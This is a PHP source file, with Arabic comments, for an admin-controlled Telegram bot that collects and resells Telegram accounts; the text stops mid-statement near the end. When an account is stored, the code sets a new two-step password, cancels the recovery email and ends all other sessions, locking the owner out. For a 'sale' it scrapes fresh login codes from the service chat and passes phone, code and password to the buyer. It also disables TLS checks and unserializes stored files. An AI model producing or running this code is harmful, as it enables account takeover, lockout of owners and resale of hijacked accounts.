<?php
// ═══════════════════════════════════════════════════════════════════════════
// 🔥🔥🔥 بوت إدارة حسابات تيلجرام - الإصدار النهائي المتكامل 🔥🔥🔥
// ═══════════════════════════════════════════════════════════════════════════

require_once __DIR__ . '/madeline.php';
require_once __DIR__ . '/config.php';

use danog\MadelineProto\API;
use danog\MadelineProto\Settings\AppInfo;
use danog\MadelineProto\Settings;

// ═══════════════════════════════════════════════════════════════════════════
// 📦 قاعدة البيانات والإعدادات الأولية
// ═══════════════════════════════════════════════════════════════════════════

$folders = [__DIR__ . '/database', SESSIONS_PATH, SERIALIZED_PATH];
foreach ($folders as $folder) {
    if (!is_dir($folder)) mkdir($folder, 0777, true);
}

$db = new PDO('sqlite:' . DB_PATH);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec("PRAGMA journal_mode=WAL");
$db->exec("
CREATE TABLE IF NOT EXISTS countries (code TEXT PRIMARY KEY, name TEXT, flag TEXT);
CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT UNIQUE, country_code TEXT, session_file TEXT, password TEXT, status TEXT DEFAULT 'active', stored_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
CREATE TABLE IF NOT EXISTS activation_sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT, admin_id INTEGER, step TEXT, temp_file TEXT, country_code TEXT, code_hash TEXT, serialized_file TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
CREATE TABLE IF NOT EXISTS pending_orders (account_id INTEGER PRIMARY KEY, buyer_id INTEGER, requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
CREATE TABLE IF NOT EXISTS sent_codes (id INTEGER PRIMARY KEY AUTOINCREMENT, account_id INTEGER, code TEXT, sent_at INTEGER, UNIQUE(account_id, code));
");
// قائمة الدول
$masterCountries = [
    '967' => ['اليمن', '🇾🇪'], '966' => ['السعودية', '🇸🇦'], '20' => ['مصر', '🇪🇬'],
    '213' => ['الجزائر', '🇩🇿'], '212' => ['المغرب', '🇲🇦'], '216' => ['تونس', '🇹🇳'],
    '218' => ['ليبيا', '🇱🇾'], '964' => ['العراق', '🇮🇶'], '962' => ['الأردن', '🇯🇴'],
    '961' => ['لبنان', '🇱🇧'], '970' => ['فلسطين', '🇵🇸'], '971' => ['الإمارات', '🇦🇪'],
    '968' => ['عمان', '🇴🇲'], '974' => ['قطر', '🇶🇦'], '965' => ['الكويت', '🇰🇼'],
    '1' => ['أمريكا/كندا', '🇺🇸🇨🇦'], '44' => ['بريطانيا', '🇬🇧'], '91' => ['الهند', '🇮🇳'],
    '92' => ['باكستان', '🇵🇰'], '90' => ['تركيا', '🇹🇷'], '49' => ['ألمانيا', '🇩🇪'],
    '33' => ['فرنسا', '🇫🇷'], '34' => ['إسبانيا', '🇪🇸'], '39' => ['إيطاليا', '🇮🇹'],
    '7' => ['روسيا', '🇷🇺'], '81' => ['اليابان', '🇯🇵'], '86' => ['الصين', '🇨🇳'],
    '66' => ['تايلاند', '🇹🇭']
];

// إنشاء الجداول


// إضافة الدول
$stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
foreach ($masterCountries as $code => $info) {
    $stmt->execute([$code, $info['name'], $info['flag']]);
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎨 دوال التنسيق الفخم
// ═══════════════════════════════════════════════════════════════════════════

function fancyHeader($title, $icon = '✨') {
    return "╔════════════════════════════════════════╗\n║  {$icon} <b>" . strtoupper($title) . "</b> {$icon}  ║\n╠════════════════════════════════════════╣\n";
}

function fancyFooter() {
    return "\n╚════════════════════════════════════════╝\n⚡ <i>" . FOOTER_TEXT . "</i> ⚡";
}

function fancyMessage($title, $content, $icon = '📌') {
    return fancyHeader($title, $icon) . $content . fancyFooter();
}

function formatPhone($phone) { return "📞 <code>" . htmlspecialchars($phone) . "</code>"; }
function formatCode($code) { return "🔑 <code>" . htmlspecialchars($code) . "</code>"; }
function formatPassword($pass) { return "🔐 <code>" . htmlspecialchars($pass) . "</code>"; }
function formatDate() { return "🕒 <i>" . date('Y-m-d | h:i:s A') . "</i>"; }

// ═══════════════════════════════════════════════════════════════════════════
// 🔧 دوال مساعدة
// ═══════════════════════════════════════════════════════════════════════════

function getCountryByPhone($phone, $db) {
    $clean = preg_replace('/[^0-9]/', '', $phone);
    $stmt = $db->query("SELECT code, name, flag FROM countries ORDER BY LENGTH(code) DESC");
    foreach ($stmt->fetchAll(PDO::FETCH_ASSOC) as $country) {
        if (strpos($clean, $country['code']) === 0) return $country;
    }
    return null;
}

function normalizePhone($phone) {
    $clean = preg_replace('/[^0-9]/', '', $phone);
    return '+' . ltrim($clean, '0');
}

function botApi($method, $params) {
    $ch = curl_init("https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function sendMessage($chat_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    return botApi('sendMessage', $params);
}

function editMessage($chat_id, $msg_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'message_id' => $msg_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    return botApi('editMessageText', $params);
}

function answerCallback($id, $text = null) {
    $params = ['callback_query_id' => $id];
    if ($text) $params['text'] = $text;
    botApi('answerCallbackQuery', $params);
}

// ========== دالة تسجيل الخروج القسري مع محاولات متكررة ==========
function forceLogout($sessionFile, $phone, $acc_id, $db, $retry = true) {
    try {
        if (!file_exists($sessionFile)) {
            $db->prepare("UPDATE accounts SET status='removed' WHERE id=?")->execute([$acc_id]);
            return ['success' => false, 'message' => 'ملف الجلسة غير موجود'];
        }
        
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        
        $mad = new API($sessionFile, $settings);
        $mad->start();
        
        // محاولة تسجيل الخروج
        try {
            $mad->logout();
        } catch (Exception $e) {
            if ($retry) {
                sleep(5);
                return forceLogout($sessionFile, $phone, $acc_id, $db, false);
            }
        }
        
        // حذف ملف الجلسة
        if (file_exists($sessionFile)) unlink($sessionFile);
        
        // تحديث حالة الحساب
        $db->prepare("UPDATE accounts SET status='removed' WHERE id=?")->execute([$acc_id]);
        
        return ['success' => true, 'message' => 'تم تسجيل الخروج بنجاح'];
        
    } catch (Exception $e) {
        if ($retry) {
            sleep(5);
            return forceLogout($sessionFile, $phone, $acc_id, $db, false);
        }
        return ['success' => false, 'message' => $e->getMessage()];
    }
}

function saveSerialized($mad, $phone) {
    $file = SERIALIZED_PATH . md5($phone) . '.txt';
    file_put_contents($file, base64_encode(serialize($mad)));
    return $file;
}

function loadSerialized($file) {
    if (!file_exists($file)) return null;
    return unserialize(base64_decode(file_get_contents($file)));
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 المعالجة الرئيسية
// ═══════════════════════════════════════════════════════════════════════════

$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

$message = $update['message'] ?? null;
$callback = $update['callback_query'] ?? null;
$chat_id = $message['chat']['id'] ?? ($callback['message']['chat']['id'] ?? 0);
$user_id = $message['from']['id'] ?? ($callback['from']['id'] ?? 0);
$msg_id = $callback['message']['message_id'] ?? 0;

// التحقق من صلاحيات المدير
if ($user_id != ADMIN_ID) {
    if ($message) sendMessage($chat_id, "⛔ غير مصرح");
    exit;
}

// ═══════════════════════════════════════════════════════════════════════════
// 🏠 /start
// ═══════════════════════════════════════════════════════════════════════════

if ($message && trim($message['text'] ?? '') === '/start') {
    $text = fancyHeader('مرحباً أيها المدير', '👑') . "
🌟 <b>" . BOT_NAME . "</b> 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>✨ نظام إدارة حسابات تيلجرام الاحترافي ✨</b>
📡 <b>الإصدار:</b> " . BOT_VERSION . "
⚙️ <b>الحالة:</b> <code>ONLINE 🟢</code>
" . fancyFooter();

    $keyboard = [
        'inline_keyboard' => [
            [['text' => '📦 🏦 تخزين حسابات جديدة', 'callback_data' => 'store']],
            [['text' => '🛒 💰 جلب حسابات للبيع', 'callback_data' => 'buy']],
            [['text' => '🌍 📊 عرض المخزون والإحصائيات', 'callback_data' => 'stock']],
            [['text' => '🌍 ⚙️ إدارة الدول', 'callback_data' => 'manage_countries']]
        ]
    ];
    sendMessage($chat_id, $text, $keyboard);
    exit;
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎮 معالجة الأزرار
// ═══════════════════════════════════════════════════════════════════════════

if ($callback) {
    answerCallback($callback['id']);
    $data = $callback['data'];

    // ========== 1. تخزين حساب جديد ==========
    if ($data === 'store') {
        $tempFile = SESSIONS_PATH . 'temp_' . uniqid() . '.madeline';
        $db->prepare("INSERT INTO activation_sessions (admin_id, step, temp_file) VALUES (?, 'awaiting_phone', ?)")->execute([$user_id, $tempFile]);
        
        $text = fancyMessage('📦 تخزين حساب جديد', "
📱 <b>أرسل رقم الهاتف</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 <b>الصيغ المدعومة:</b>
• <code>+967XXXXXXXX</code>
• <code>00967XXXXXXXX</code>
• <code>967XXXXXXXX</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 سيتم التعرف على الدولة تلقائياً
" . formatDate(), '📦');
        
        $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'back_main']]]];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== 2. جلب حسابات للبيع ==========
    elseif ($data === 'buy') {
        $rows = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code")->fetchAll(PDO::FETCH_ASSOC);
        
        if (!$rows) {
            $text = fancyMessage('🛒 جلب حسابات', "📭 لا يوجد حسابات متاحة حالياً", '🛒');
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'back_main']]]];
            editMessage($chat_id, $msg_id, $text, $keyboard);
        } else {
            $buttons = [];
            foreach ($rows as $row) {
                $c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $c->execute([$row['country_code']]);
                $country = $c->fetch(PDO::FETCH_ASSOC);
                if ($country) $buttons[] = [['text' => "{$country['flag']} {$country['name']} ━━━ {$row['cnt']} حسابات 📦", 'callback_data' => "buy_{$row['country_code']}"]];
            }
            $buttons[] = [['text' => '🔙 رجوع', 'callback_data' => 'back_main']];
            
            $text = fancyMessage('🌍 اختيار الدولة', "📋 اختر الدولة التي تريد شراء حساب منها\n" . formatDate(), '🌍');
            editMessage($chat_id, $msg_id, $text, ['inline_keyboard' => $buttons]);
        }
        exit;
    }
    
    // ========== 3. عرض المخزون والإحصائيات ==========
    elseif ($data === 'stock') {
        $rows = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code")->fetchAll(PDO::FETCH_ASSOC);
        
        if (!$rows) {
            $text = fancyMessage('📊 المخزون', "📭 لا يوجد حسابات في المخزون", '📊');
        } else {
            $stockMsg = "📊 <b>تقرير المخزون الحالي</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
            $total = 0;
            foreach ($rows as $row) {
                $c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $c->execute([$row['country_code']]);
                $country = $c->fetch(PDO::FETCH_ASSOC);
                if ($country) {
                    $stockMsg .= "{$country['flag']} <b>{$country['name']}</b> ━━━ <code>{$row['cnt']}</code> حسابات\n";
                    $total += $row['cnt'];
                }
            }
            $stockMsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 <b>الإجمالي:</b> <code>$total</code> حساب\n" . formatDate();
            $text = fancyMessage('📊 تقرير المخزون', $stockMsg, '📊');
        }
        $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'back_main']]]];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== 4. إدارة الدول ==========
    elseif ($data === 'manage_countries') {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '📋 عرض جميع الدول', 'callback_data' => 'list_countries']],
                [['text' => '🔄 تحديث الدول', 'callback_data' => 'reset_countries']],
                [['text' => '➕ إضافة دولة جديدة', 'callback_data' => 'add_country']],
                [['text' => '🔙 رجوع', 'callback_data' => 'back_main']]
            ]
        ];
        $text = fancyMessage('🌍 إدارة الدول', "📋 لوحة التحكم بالدول\n" . formatDate(), '🌍');
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== عرض الدول ==========
    elseif ($data === 'list_countries') {
        $countries = $db->query("SELECT * FROM countries ORDER BY code")->fetchAll(PDO::FETCH_ASSOC);
        $msg = "📋 <b>قائمة الدول المخزنة</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        foreach ($countries as $c) $msg .= "{$c['flag']} <b>{$c['name']}</b> ━━━ رمز: <code>{$c['code']}</code>\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 <b>الإجمالي:</b> " . count($countries) . " دولة\n" . formatDate();
        $text = fancyMessage('📋 قائمة الدول', $msg, '📋');
        $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'manage_countries']]]];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== تحديث الدول ==========
    elseif ($data === 'reset_countries') {
        $db->exec("DELETE FROM countries");
        $stmt = $db->prepare("INSERT INTO countries (code, name, flag) VALUES (?, ?, ?)");
        foreach ($masterCountries as $code => $info) $stmt->execute([$code, $info['name'], $info['flag']]);
        $text = fancyMessage('🔄 تحديث الدول', "✅ تم تحديث " . count($masterCountries) . " دولة\n" . formatDate(), '🔄');
        $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'manage_countries']]]];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== إضافة دولة جديدة ==========
    elseif ($data === 'add_country') {
        $db->prepare("INSERT OR REPLACE INTO activation_sessions (admin_id, step, temp_file) VALUES (?, 'add_country_name', '')")->execute([$user_id]);
        $text = fancyMessage('➕ إضافة دولة جديدة', "📝 أرسل اسم الدولة\nمثال: تايلاند\n" . formatDate(), '➕');
        $keyboard = ['inline_keyboard' => [[['text' => '🔙 إلغاء', 'callback_data' => 'manage_countries']]]];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== رجوع للقائمة الرئيسية ==========
    elseif ($data === 'back_main') {
        $text = fancyHeader('مرحباً أيها المدير', '👑') . "
🌟 <b>" . BOT_NAME . "</b> 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>✨ نظام إدارة حسابات تيلجرام الاحترافي ✨</b>
📡 <b>الإصدار:</b> " . BOT_VERSION . "
⚙️ <b>الحالة:</b> <code>ONLINE 🟢</code>
" . fancyFooter();
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '📦 🏦 تخزين حسابات جديدة', 'callback_data' => 'store']],
                [['text' => '🛒 💰 جلب حسابات للبيع', 'callback_data' => 'buy']],
                [['text' => '🌍 📊 عرض المخزون والإحصائيات', 'callback_data' => 'stock']],
                [['text' => '🌍 ⚙️ إدارة الدول', 'callback_data' => 'manage_countries']]
            ]
        ];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
    
    // ========== اختيار دولة للشراء ==========
    elseif (preg_match('/^buy_(\d+)$/', $data, $m)) {
        $code = $m[1];
        $acc = $db->prepare("SELECT id, phone FROM accounts WHERE country_code=? AND status='active' LIMIT 1");
        $acc->execute([$code]);
        $account = $acc->fetch(PDO::FETCH_ASSOC);
        
        if (!$account) {
            $text = fancyMessage('❌ خطأ', "لا يوجد حسابات متاحة لهذه الدولة", '❌');
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'buy']]]];
            editMessage($chat_id, $msg_id, $text, $keyboard);
        } else {
            $db->prepare("INSERT OR REPLACE INTO pending_orders (account_id, buyer_id) VALUES (?, ?)")->execute([$account['id'], $user_id]);
            $c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $c->execute([$code]);
            $country = $c->fetch(PDO::FETCH_ASSOC);
            $msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🗺️ <b>الدولة:</b> {$country['flag']} {$country['name']}\n" . formatPhone($account['phone']) . "\n🔑 <b>الكود:</b> <i>⏳ قيد الانتظار...</i>\n" . formatDate() . "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
            $text = fancyMessage('📋 معلومات الحساب', $msg, '📋');
            $keyboard = [
                'inline_keyboard' => [
                    [['text' => '📲 ✨ طلب كود الدخول ✨ 📲', 'callback_data' => "code_{$account['id']}"]],
                    [['text' => '🔙 رجوع', 'callback_data' => 'buy']]
                ]
            ];
            editMessage($chat_id, $msg_id, $text, $keyboard);
        }
        exit;
    }
    
    // ========== طلب الكود ==========
    elseif (preg_match('/^code_(\d+)$/', $data, $m)) {
        $acc_id = $m[1];
        answerCallback($callback['id'], '⏳ جاري طلب الكود...');
        
        $acc = $db->prepare("SELECT phone, session_file, password FROM accounts WHERE id=? AND status='active'");
        $acc->execute([$acc_id]);
        $account = $acc->fetch(PDO::FETCH_ASSOC);
        
        if (!$account) {
            $text = fancyMessage('❌ خطأ', "الحساب غير متوفر", '❌');
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'buy']]]];
            editMessage($chat_id, $msg_id, $text, $keyboard);
            exit;
        }
        
        if (!file_exists($account['session_file'])) {
            $text = fancyMessage('⚠️ إنذار', "⚠️ ملف الجلسة مفقود للحساب {$account['phone']}\nسيتم إزالته من المخزون تلقائياً", '⚠️');
            $db->prepare("UPDATE accounts SET status='removed' WHERE id=?")->execute([$acc_id]);
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'buy']]]];
            editMessage($chat_id, $msg_id, $text, $keyboard);
            exit;
        }
        
        try {
            $settings = new Settings();
            $appInfo = new AppInfo();
            $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
            $settings->setAppInfo($appInfo);
            $mad = new API($account['session_file'], $settings);
            $mad->start();
            
            // طلب إرسال كود جديد
            $mad->phoneLogin($account['phone']);
            
            // تحديث الرسالة بحالة الانتظار
            $waitText = fancyMessage('⏳ جاري البحث عن الكود', "📡 يتم البحث داخل محادثة 777000\n⏱️ يرجى الانتظار حتى 5 دقائق\n<a href='tg://openmessage?user_id=777000'>🚀 اضغط لفتح المحادثة يدوياً</a>\n" . formatDate(), '⏳');
            editMessage($chat_id, $msg_id, $waitText, ['inline_keyboard' => [[['text' => '📩 فتح محادثة الكود', 'url' => 'tg://openmessage?user_id=777000']]]]);
            
            // البحث عن الكود لمدة 5 دقائق (300 ثانية)
            $code = null;
            $startTime = time();
            $timeout = 300; // 5 دقائق
            
            while (time() - $startTime < $timeout) {
                try {
                    $msgs = $mad->messages->getHistory(['peer' => 777000, 'limit' => 15]);
                    foreach ($msgs['messages'] as $msg) {
                        if (isset($msg['message']) && preg_match('/\b(\d{5,6})\b/', $msg['message'], $match)) {
                            $potentialCode = $match[1];
                            // التحقق من عدم تكرار الكود
                            $check = $db->prepare("SELECT COUNT(*) FROM sent_codes WHERE account_id=? AND code=?");
                            $check->execute([$acc_id, $potentialCode]);
                            if ($check->fetchColumn() == 0) {
                                $code = $potentialCode;
                                $db->prepare("INSERT INTO sent_codes (account_id, code, sent_at) VALUES (?, ?, ?)")->execute([$acc_id, $code, time()]);
                                break 2;
                            }
                        }
                    }
                } catch (Exception $e) {}
                sleep(2);
            }
            
            // إذا لم يتم العثور على كود خلال 5 دقائق
            if (!$code) {
                $text = fancyMessage('⚠️ إنذار - فشل استلام الكود', "⚠️ لم يتم استلام كود جديد خلال 5 دقائق للحساب {$account['phone']}\n\n📌 الأسباب المحتملة:\n• الحساب غير نشط\n• تم حذف الجلسة\n• مشكلة في الاتصال\n\n🔄 يمكنك إعادة المحاولة", '⚠️');
                $keyboard = ['inline_keyboard' => [[['text' => '🔄 إعادة المحاولة', 'callback_data' => "code_{$acc_id}"]]]];
                editMessage($chat_id, $msg_id, $text, $keyboard);
                exit;
            }
            
            $pass = $account['password'] ?? 'لا توجد';
            
            $c = $db->prepare("SELECT flag, name FROM countries WHERE code=(SELECT country_code FROM accounts WHERE id=?)");
            $c->execute([$acc_id]);
            $country = $c->fetch(PDO::FETCH_ASSOC);
            
            $msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🗺️ <b>الدولة:</b> {$country['flag']} {$country['name']}\n" . formatPhone($account['phone']) . "\n" . formatCode($code) . "\n" . formatPassword($pass) . "\n" . formatDate() . "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
            $text = fancyMessage('✅ تم جلب الكود', $msg, '✅');
            $keyboard = [
                'inline_keyboard' => [
                    [['text' => '🔄 📲 طلب كود جديد', 'callback_data' => "code_{$acc_id}"]],
                    [['text' => '🚪 🔓 تسجيل الخروج من الحساب', 'callback_data' => "logout_{$acc_id}"]],
                    [['text' => '🔙 رجوع', 'callback_data' => 'buy']]
                ]
            ];
            editMessage($chat_id, $msg_id, $text, $keyboard);
            
        } catch (Exception $e) {
            $text = fancyMessage('⚠️ إنذار - خطأ في الاتصال', "⚠️ فشل الاتصال بالحساب {$account['phone']}\n\nالخطأ: " . $e->getMessage() . "\n\nقد تكون الجلسة منتهية أو الحساب محظور", '⚠️');
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع', 'callback_data' => 'buy']]]];
            editMessage($chat_id, $msg_id, $text, $keyboard);
        }
        exit;
    }
    
    // ========== تسجيل الخروج من الحساب ==========
    elseif (preg_match('/^logout_(\d+)$/', $data, $m)) {
        $acc_id = $m[1];
        $acc = $db->prepare("SELECT session_file, phone FROM accounts WHERE id=?");
        $acc->execute([$acc_id]);
        $account = $acc->fetch(PDO::FETCH_ASSOC);
        
        if ($account) {
            $result = forceLogout($account['session_file'], $account['phone'], $acc_id, $db);
            if ($result['success']) {
                $text = fancyMessage('✅ تم تسجيل الخروج', "🔓 تم تسجيل الخروج من {$account['phone']} وإزالة الحساب من المخزون\n" . formatDate(), '✅');
            } else {
                $text = fancyMessage('⚠️ إنذار', "⚠️ فشل تسجيل الخروج من {$account['phone']}\n" . $result['message'] . "\nتم إزالة الحساب من المخزون قسراً", '⚠️');
            }
        } else {
            $text = fancyMessage('❌ خطأ', "الحساب غير موجود", '❌');
        }
        $keyboard = ['inline_keyboard' => [[['text' => '🔙 رجوع للشراء', 'callback_data' => 'buy']]]];
        editMessage($chat_id, $msg_id, $text, $keyboard);
        exit;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📝 معالجة الرسائل النصية (تخزين حساب جديد + 2FA)
// ═══════════════════════════════════════════════════════════════════════════

if ($message && !$callback) {
    $text = trim($message['text'] ?? '');
    $session = $db->prepare("SELECT * FROM activation_sessions WHERE admin_id=? ORDER BY created_at DESC LIMIT 1");
    $session->execute([$user_id]);
    $session = $session->fetch(PDO::FETCH_ASSOC);
    
    // ========== إضافة دولة جديدة - الاسم ==========
    if ($session && $session['step'] === 'add_country_name') {
        if (strlen($text) < 2) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "الاسم قصير جداً", '❌'));
            exit;
        }
        $db->prepare("UPDATE activation_sessions SET phone=?, step='add_country_code' WHERE admin_id=?")->execute([$text, $user_id]);
        sendMessage($chat_id, fancyMessage('➕ إضافة دولة', "📝 أرسل رمز الدولة (أرقام فقط)\nمثال: 66", '➕'));
        exit;
    }
    
    // ========== إضافة دولة جديدة - الرمز ==========
    elseif ($session && $session['step'] === 'add_country_code') {
        if (!preg_match('/^\d{1,4}$/', $text)) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "الرمز غير صالح (1-4 أرقام)", '❌'));
            exit;
        }
        $exists = $db->prepare("SELECT COUNT(*) FROM countries WHERE code=?");
        $exists->execute([$text]);
        if ($exists->fetchColumn() > 0) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "الرمز $text موجود بالفعل", '❌'));
            exit;
        }
        $db->prepare("UPDATE activation_sessions SET country_code=?, step='add_country_flag' WHERE admin_id=?")->execute([$text, $user_id]);
        sendMessage($chat_id, fancyMessage('➕ إضافة دولة', "🏁 أرسل علم الدولة (إيموجي)\nمثال: 🇹🇭", '➕'));
        exit;
    }
    
    // ========== إضافة دولة جديدة - العلم ==========
    elseif ($session && $session['step'] === 'add_country_flag') {
        if (!preg_match('/[\x{1F1E6}-\x{1F1FF}]/u', $text)) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "العلم غير صالح", '❌'));
            exit;
        }
        $name = $session['phone'];
        $code = $session['country_code'];
        $db->prepare("INSERT INTO countries (code, name, flag) VALUES (?, ?, ?)")->execute([$code, $name, $text]);
        $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
        sendMessage($chat_id, fancyMessage('✅ تمت الإضافة', "🎉 تم إضافة $name $text\nرمز: $code", '✅'));
        exit;
    }
    
    // ========== استقبال الرقم للتخزين ==========
    elseif ($session && $session['step'] === 'awaiting_phone') {
        $phone = normalizePhone($text);
        $country = getCountryByPhone($phone, $db);
        
        if (!$country) {
            sendMessage($chat_id, fancyMessage('❌ خطأ في الرقم', "لم نتعرف على الدولة\nالصيغ المدعومة:\n+967XXXXXXXX\n00967XXXXXXXX\n967XXXXXXXX\n" . formatDate(), '❌'));
            exit;
        }
        
        $db->prepare("UPDATE activation_sessions SET phone=?, country_code=?, step='awaiting_code' WHERE admin_id=?")->execute([$phone, $country['code'], $user_id]);
        
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        
        try {
            $mad = new API($tempFile, $settings);
            $sent = $mad->phoneLogin($phone);
            $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?")->execute([$sent['phone_code_hash'], $user_id]);
            sendMessage($chat_id, fancyMessage('✅ تم إرسال الكود', "📱 تم إرسال كود التفعيل إلى:\n" . formatPhone($phone) . "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📝 أرسل الكود الآن (5-6 أرقام)", '✅'));
        } catch (Exception $e) {
            sendMessage($chat_id, fancyMessage('❌ فشل', "فشل إرسال الكود: " . $e->getMessage(), '❌'));
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
        }
        exit;
    }
    
    // ========== استقبال الكود ==========
    elseif ($session && $session['step'] === 'awaiting_code' && preg_match('/^\d{5,6}$/', $text)) {
        $phone = $session['phone'];
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        
        try {
            $mad = new API($tempFile, $settings);
            $authorization = $mad->completePhoneLogin($text, $session['code_hash']);
            
            // ========== التحقق من وجود كلمة مرور خطوتين (2FA) ==========
            if ($authorization['_'] === 'account.password') {
                $serializedFile = saveSerialized($mad, $phone);
                $db->prepare("UPDATE activation_sessions SET step='awaiting_password', serialized_file=? WHERE admin_id=?")->execute([$serializedFile, $user_id]);
                sendMessage($chat_id, fancyMessage('🔐 كلمة مرور خطوتين', "⚠️ هذا الحساب محمي بكلمة مرور خطوتين\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📝 أرسل كلمة المرور القديمة", '🔐'));
                exit;
            }
            
            // ========== لا توجد كلمة مرور - إكمال التخزين ==========
            $newPassword = bin2hex(random_bytes(8));
            
            // تغيير كلمة المرور
            try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
            
            // إلغاء البريد الإلكتروني للاسترداد
            try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
            
            // إنهاء الجلسات الأخرى
            try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
            
            // تسجيل الخروج
            try { $mad->logout(); } catch (Exception $e) {}
            
            $finalFile = SESSIONS_PATH . md5($phone) . '.madeline';
            if (file_exists($tempFile)) rename($tempFile, $finalFile);
            
            $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")->execute([$phone, $session['country_code'], $finalFile, $newPassword]);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            
            sendMessage($chat_id, fancyMessage('🎉 تم التخزين بنجاح', "✅ تم تخزين الحساب\n" . formatPhone($phone) . "\n🔐 كلمة المرور الجديدة: " . formatPassword($newPassword) . "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ تم تغيير كلمة المرور وإلغاء البريد الإلكتروني", '🎉'));
            
        } catch (Exception $e) {
            if (strpos($e->getMessage(), 'PHONE_CODE_INVALID') !== false) {
